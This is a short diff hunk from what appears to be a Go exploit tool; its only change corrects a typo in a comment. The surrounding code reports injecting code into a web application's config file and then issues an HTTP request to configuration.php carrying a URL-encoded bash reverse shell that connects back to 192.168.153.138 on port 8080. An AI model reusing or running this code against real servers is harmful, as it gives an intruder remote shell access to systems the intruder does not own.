@@ -146,7 +146,7 @@ func injectCode(link string, cred credential) {
 
 	color.Green("[x] Code has been injected into the config file!")
 
-	// Initate the reverse shell (reverse shell)
+	// Initiate the reverse shell 
 
 	_, err = http.Get(link + "videos/configuration.php?x=%2Fbin%2Fbash -c 'bash -i > %2Fdev%2Ftcp%2F192.168.153.138%2F8080 0>%261'%0A")
 	if err != nil {
